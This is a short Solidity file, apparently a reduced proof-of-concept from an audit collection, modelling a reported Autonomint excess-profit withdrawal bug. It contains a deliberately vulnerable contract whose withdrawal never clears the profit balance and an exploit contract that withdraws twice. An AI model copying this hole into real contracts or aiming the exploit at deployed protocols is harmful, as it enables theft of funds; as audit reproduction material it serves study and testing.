// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// AuditVault 45458: Autonomint excess profit withdrawal. Reduced local model preserves the reported state transition.

contract Vulnerable {
    uint256 public excessProfitCumulativeValue = 100; uint256 public withdrawn; function withdrawProfit() external { withdrawn += excessProfitCumulativeValue; }
}

contract Exploit {
    Vulnerable public bug;
    bool public success;

    constructor() {
        bug = new Vulnerable();
    }

    function attack() external {
        bug.withdrawProfit(); bug.withdrawProfit(); success = bug.withdrawn() == 200;
    }
}


